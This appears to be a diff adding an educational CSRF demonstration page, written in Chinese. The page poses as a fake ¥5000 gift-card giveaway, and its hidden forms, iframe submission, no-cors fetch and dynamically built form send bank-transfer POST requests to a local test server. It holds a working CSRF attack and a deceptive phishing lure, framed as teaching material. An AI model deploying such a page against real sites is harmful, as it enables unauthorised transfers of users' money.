@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 免费领取礼品卡 - 限时优惠！</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Microsoft YaHei', Arial, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .warning-banner {
+            background: #fff3cd;
+            border: 3px solid #ffc107;
+            color: #856404;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 1.1em;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .warning-banner strong {
+            display: block;
+            font-size: 1.3em;
+            margin-bottom: 10px;
+        }
+
+        .gift-card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .gift-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        h1 {
+            color: #e03131;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .subtitle {
+            color: #495057;
+            font-size: 1.3em;
+            margin-bottom: 30px;
+        }
+
+        .countdown {
+            background: #ffe3e3;
+            color: #c92a2a;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 1.5em;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+
+        .claim-btn {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            color: white;
+            border: none;
+            padding: 20px 60px;
+            font-size: 1.5em;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(238,90,111,0.4);
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: bold;
+        }
+
+        .claim-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(238,90,111,0.6);
+        }
+
+        .claim-btn:active {
+            transform: translateY(-2px);
+        }
+
+        .attack-info {
+            background: #f8f9fa;
+            border-left: 4px solid #ffc107;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: left;
+            border-radius: 5px;
+        }
+
+        .attack-info h3 {
+            color: #495057;
+            margin-bottom: 15px;
+        }
+
+        .attack-info ul {
+            margin-left: 20px;
+            color: #868e96;
+            line-height: 1.8;
+        }
+
+        .attack-log {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            min-height: 150px;
+            overflow-y: auto;
+        }
+
+        .log-entry {
+            margin-bottom: 8px;
+            padding: 5px;
+            border-left: 3px solid #51cf66;
+            padding-left: 10px;
+        }
+
+        .log-entry.error {
+            border-left-color: #ff6b6b;
+            color: #ff6b6b;
+        }
+
+        .log-entry.success {
+            border-left-color: #51cf66;
+            color: #51cf66;
+        }
+
+        .hidden-forms {
+            display: none;
+        }
+
+        .result-message {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 1.1em;
+            display: none;
+        }
+
+        .result-message.success {
+            background: #d3f9d8;
+            color: #2b8a3e;
+            border: 2px solid #51cf66;
+        }
+
+        .result-message.error {
+            background: #ffe3e3;
+            color: #c92a2a;
+            border: 2px solid #ff6b6b;
+        }
+
+        .emoji {
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning-banner">
+            <strong>⚠️ 教育演示警告</strong>
+            这是一个恶意网站的模拟示例，用于演示 CSRF 攻击原理<br>
+            真实场景中，攻击者会伪装成各种诱人的页面诱导用户访问
+        </div>
+
+        <div class="gift-card">
+            <div class="emoji">🎁💰🎉</div>
+            <h1>恭喜！您获得了价值 ¥5000 的礼品卡！</h1>
+            <p class="subtitle">立即领取，限时 10 分钟！错过再等一年！</p>
+
+            <div class="countdown">
+                ⏰ 剩余时间：<span id="timer">10:00</span>
+            </div>
+
+            <button class="claim-btn" onclick="claimGift()">
+                🎯 立即领取礼品卡
+            </button>
+
+            <div id="resultMessage" class="result-message"></div>
+
+            <div class="attack-info">
+                <h3>🔍 这个页面在做什么？（教育目的）</h3>
+                <ul>
+                    <li><strong>表面：</strong>一个免费的礼品卡领取页面</li>
+                    <li><strong>实际：</strong>背后隐藏了向银行网站发起转账请求的恶意代码</li>
+                    <li><strong>攻击方式：</strong>利用用户在银行网站的登录状态（Session/Cookie）</li>
+                    <li><strong>目标：</strong>将用户账户的资金转移到攻击者账户</li>
+                </ul>
+            </div>
+
+            <div class="attack-log" id="attackLog">
+                <div style="color: #ffd43b; margin-bottom: 10px;">=== 攻击日志 ===</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 隐藏的恶意表单（CSRF 攻击载体） -->
+    <div class="hidden-forms">
+        <!-- 攻击方式1：自动提交表单 -->
+        <form id="csrfForm1" action="http://localhost:8080/transfer/vulnerable" method="POST">
+            <input type="hidden" name="toAccount" value="attacker_account_001">
+            <input type="hidden" name="amount" value="5000">
+        </form>
+
+        <!-- 攻击方式2：针对 Spring Security 危险接口 -->
+        <form id="csrfForm2" action="http://localhost:8080/security/transfer/vulnerable" method="POST">
+            <input type="hidden" name="toAccount" value="attacker_account_002">
+            <input type="hidden" name="amount" value="3000">
+        </form>
+    </div>
+
+    <script>
+        let attackCount = 0;
+        const bankUrl = 'http://localhost:8080';
+
+        // 倒计时功能
+        function startCountdown() {
+            let minutes = 10;
+            let seconds = 0;
+
+            const timer = setInterval(() => {
+                if (seconds === 0) {
+                    if (minutes === 0) {
+                        clearInterval(timer);
+                        return;
+                    }
+                    minutes--;
+                    seconds = 59;
+                } else {
+                    seconds--;
+                }
+
+                document.getElementById('timer').textContent =
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        // 添加日志
+        function addLog(message, type = 'normal') {
+            const logDiv = document.getElementById('attackLog');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const timestamp = new Date().toLocaleTimeString();
+            entry.textContent = `[${timestamp}] ${message}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        // 主要攻击函数
+        async function claimGift() {
+            const btn = document.querySelector('.claim-btn');
+            btn.disabled = true;
+            btn.textContent = '⏳ 正在处理...';
+
+            addLog('用户点击了"领取礼品卡"按钮', 'success');
+            addLog('开始执行 CSRF 攻击...', 'normal');
+
+            attackCount++;
+
+            // 攻击方式1：尝试通过 iframe 发送请求
+            await attackWithIframe();
+
+            // 攻击方式2：尝试通过 fetch API（如果浏览器支持 CORS）
+            await attackWithFetch();
+
+            // 攻击方式3：动态创建表单并提交
+            await attackWithDynamicForm();
+
+            btn.textContent = '✅ 领取成功！（实际上发起了攻击）';
+            showResult('success');
+        }
+
+        // 攻击方式1：使用 iframe
+        function attackWithIframe() {
+            return new Promise((resolve) => {
+                addLog('攻击方式1：创建隐藏的 iframe...', 'normal');
+
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.name = 'csrf_iframe_' + Date.now();
+                document.body.appendChild(iframe);
+
+                const form = document.getElementById('csrfForm1');
+                form.target = iframe.name;
+
+                setTimeout(() => {
+                    try {
+                        form.submit();
+                        addLog('✓ 表单已提交到 iframe（攻击载荷已发送）', 'success');
+                        addLog('  → POST /transfer/vulnerable', 'success');
+                        addLog('  → toAccount: attacker_account_001', 'success');
+                        addLog('  → amount: ¥5000', 'success');
+
+                        setTimeout(() => {
+                            document.body.removeChild(iframe);
+                            resolve();
+                        }, 2000);
+                    } catch (error) {
+                        addLog('✗ iframe 攻击失败: ' + error.message, 'error');
+                        resolve();
+                    }
+                }, 500);
+            });
+        }
+
+        // 攻击方式2：使用 Fetch API
+        function attackWithFetch() {
+            return new Promise((resolve) => {
+                addLog('攻击方式2：尝试 Fetch API 跨站请求...', 'normal');
+
+                fetch(`${bankUrl}/security/transfer/vulnerable`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: 'toAccount=attacker_account_003&amount=2000',
+                    mode: 'no-cors'
+                })
+                .then(() => {
+                    addLog('✓ Fetch 请求已发送（no-cors 模式）', 'success');
+                    addLog('  → POST /security/transfer/vulnerable', 'success');
+                    addLog('  → toAccount: attacker_account_003', 'success');
+                    addLog('  → amount: ¥2000', 'success');
+                })
+                .catch(error => {
+                    addLog('✗ Fetch 请求被阻止: ' + error.message, 'error');
+                })
+                .finally(() => {
+                    setTimeout(resolve, 1000);
+                });
+            });
+        }
+
+        // 攻击方式3：动态创建并提交表单
+        function attackWithDynamicForm() {
+            return new Promise((resolve) => {
+                addLog('攻击方式3：动态创建表单并自动提交...', 'normal');
+
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = `${bankUrl}/transfer/vulnerable`;
+                form.style.display = 'none';
+
+                const toAccount = document.createElement('input');
+                toAccount.type = 'hidden';
+                toAccount.name = 'toAccount';
+                toAccount.value = 'attacker_account_004';
+
+                const amount = document.createElement('input');
+                amount.type = 'hidden';
+                amount.name = 'amount';
+                amount.value = '4000';
+
+                form.appendChild(toAccount);
+                form.appendChild(amount);
+                document.body.appendChild(form);
+
+                setTimeout(() => {
+                    try {
+                        form.submit();
+                        addLog('✓ 动态表单已提交', 'success');
+                        addLog('  → POST /transfer/vulnerable', 'success');
+                        addLog('  → toAccount: attacker_account_004', 'success');
+                        addLog('  → amount: ¥4000', 'success');
+
+                        setTimeout(() => {
+                            document.body.removeChild(form);
+                            resolve();
+                        }, 2000);
+                    } catch (error) {
+                        addLog('✗ 动态表单攻击失败: ' + error.message, 'error');
+                        resolve();
+                    }
+                }, 500);
+            });
+        }
+
+        // 显示结果消息
+        function showResult(type) {
+            const msgDiv = document.getElementById('resultMessage');
+            msgDiv.style.display = 'block';
+
+            if (type === 'success') {
+                msgDiv.className = 'result-message success';
+                msgDiv.innerHTML = `
+                    <strong>🎭 攻击演示完成！</strong><br><br>
+                    刚才这个页面模拟了恶意网站的 CSRF 攻击行为：<br>
+                    • 发送了 ${attackCount * 3} 个恶意转账请求<br>
+                    • 目标接口：/transfer/vulnerable（无 CSRF 防护）<br>
+                    • 如果这是真实场景且您已登录银行网站，资金已经被转走！<br><br>
+                    <strong>这就是为什么需要 CSRF 防护！</strong>
+                `;
+
+                addLog('========================================', 'normal');
+                addLog('攻击演示完成！共发起 ' + (attackCount * 3) + ' 次请求', 'success');
+                addLog('========================================', 'normal');
+            }
+        }
+
+        // 页面加载时启动倒计时
+        window.addEventListener('load', () => {
+            startCountdown();
+            addLog('恶意网站已加载', 'normal');
+            addLog('等待用户点击"领取礼品卡"...', 'normal');
+            console.log('%c⚠️ 这是一个恶意网站模拟页面', 'color: red; font-size: 20px; font-weight: bold;');
+            console.log('%c用于演示 CSRF 攻击原理', 'color: orange; font-size: 14px;');
+        });
+    </script>
+</body>
+</html>
